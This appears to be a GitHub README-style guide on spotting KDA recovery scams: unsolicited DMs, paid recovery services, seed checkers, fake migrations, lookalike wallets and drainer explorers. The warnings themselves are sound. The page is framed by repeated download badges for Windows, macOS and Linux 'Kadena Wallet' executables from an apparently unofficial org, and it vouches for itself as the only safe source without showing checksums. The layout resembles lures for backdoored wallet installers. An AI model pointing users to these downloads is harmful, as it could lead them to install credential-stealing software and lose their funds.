![Kadena Wallet](assets/banner-article.png)

<h1 align="center">KDA Recovery Scams: How to Spot Them in Kadena Wallet Support</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

The shutdown of Kadena LLC created the perfect conditions for recovery fraud: a confused audience,
frozen exchange withdrawals, and no company left to ask. Scammers did not need a new idea. They
reused the oldest one - offer to help, ask for the phrase.

Here is how each pattern works, how to recognise it in seconds, and what to do instead.

## The one rule that ends most of it

No legitimate wallet, exchange, developer, moderator, or support agent will ever ask for your
recovery phrase, your private key, your keystore file, or your wallet password.

There is no exception to this. Not to "verify" you, not to "sync" your account, not to "release" a
stuck transfer, not to "whitelist" an address. Anyone who asks has already told you what they are.

Everything below is a variation on that sentence.

## Pattern 1: The direct message that arrives first

You post a question in a forum, a Telegram group, or a comment thread. Within minutes a polite
account with a developer avatar messages you privately offering to help.

**The tell:** real support does not initiate contact. A person who answers your public question in
private has chosen the one channel where nobody else can see the lie.

**What to do:** answer in the public thread only, and ignore the DM. Report the account.

## Pattern 2: The "recovery service" with a fee

A site or a person claims they can recover KDA from a wallet you no longer control, a phrase you
partly remember, or an exchange account that closed. They ask for a fee first, usually in crypto,
usually small, then a second fee when the first "unlocks" something.

**The tell:** the fee structure. A service that could genuinely recover funds would take payment
from the recovered balance, not before it.

**The reality:** a `k:` account is controlled by one key. If that key is gone, the funds are
unreachable by anyone, including the person offering to recover them. There is no recovery process
in the protocol, no support desk, and no override.

## Pattern 3: The seed checker

A page accepts a phrase and reports whether it holds funds, "for free, nothing stored". It is a
collector. Some ask for the phrase to "calculate your address"; the address is derivable from the
phrase, which is exactly why the phrase must never leave your hands.

**The tell:** the input field. The only place a phrase belongs is a wallet's own import screen, on
your machine.

**What to do:** close it. If you already entered it, treat the account as compromised and move funds
to a new account immediately, from a clean machine.

## Pattern 4: The migration that does not exist

This is the most Kadena-specific scam of the period. A page announces that KDA is migrating to a new
token, a new chain, or a new contract, and that holders must connect a wallet and claim, swap, or
register before a deadline.

**The reality:** there was no token migration. Same chain, same KDA, same accounts, same keys. The
community fork preserved balances entirely. Nothing needed to be claimed, registered, wrapped,
swapped, or proved.

**The tell:** any deadline. Deadlines exist to stop you checking.

## Pattern 5: The fake wallet build

Search for a wallet name and the top result may be an advertisement for a lookalike domain serving a
backdoored installer. The app looks right, runs, shows a balance, and sends your phrase to someone
else the first time you import.

**The tell:** the domain and the download path. Real builds live on the project's own release page.

**What to do:** navigate to the release page directly, not through a search result. If the project
publishes checksums, compare them. Where none are published, the download is unverified.

## Pattern 6: The support form that wants your password

Some phishing pages reproduce a wallet's interface, then ask you to "restore" by entering your
password and phrase together, or to upload your keystore file.

**The tell:** a password prompt inside a browser page that is not your wallet. A local wallet
password is checked locally; no server needs it.

## Pattern 7: The paid task that pays in KDA

"Test our app, earn KDA." Sometimes real, often a funnel: the task requires installing a "wallet",
or approving a contract, or paying a small onboarding fee. The community has genuine bounty
programmes; those do not require your keys or your money up front.

**The tell:** any step that asks you to approve a transaction to receive money.

## Pattern 8: The lookalike explorer

A convincing explorer shows your address with a balance, then tells you to "validate" or "activate"
it. The balance is fabricated; the validation step is a drainer.

**The tell:** explorers are read-only. Nothing on an explorer should ask you to sign anything.

## What genuine help looks like

A real answer to a stuck KDA question is boring and specific:

- Which chain the funds are on.
- Which derivation path created the account.
- Whether the address matches the one you funded, character for character.
- What a second, independent explorer reports.
- That the phrase is never needed for any of the above.

If someone's advice contains a step where you send them something, it is not support.

## If you have already been caught

1. **Move remaining funds immediately** to a new account created on a clean machine with a new phrase.
2. **Do not pay anyone** who contacts you offering to trace or recover the loss, including people who
   claim to be from the wallet, the exchange, or law enforcement.
3. **Record what happened** while it is fresh: addresses, transaction hashes, domains, account names.
4. **Report** to the platform where contact began, and to the wallet project so other users see a
   warning.
5. **Accept the limits.** On-chain transfers are final. There is no chargeback and no administrator
   who can reverse a transaction.

That last point is unpleasant and worth stating plainly: recovery after the fact is close to
impossible, which is why every defence in this space is preventative.

## A five-second test

Before acting on any KDA message, ask three questions:

1. Did they contact me first?
2. Do they want something from me - a phrase, a password, a signature, a payment?
3. Is there a deadline?

Two yeses is a scam. Three is a scam that has already worked on someone today.

## Related reading

- Kadena Wallet security: a threat model you can act on
- Is Kadena dead? What ended in 2025 and what still runs
- Lost seed phrase: what can and cannot be recovered
- Importing a Chainweaver seed into Kadena Wallet

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Running a Kadena Account From a Phone: What Actually Works](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-mobile-app-availability.md)
- [Backing Up Kadena Wallet: A Restore You Have Tested](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-backup-and-restore-guide.md)
- [12 Words, 24 Words, and the Passphrase in Between](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-seed-phrase-word-counts.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
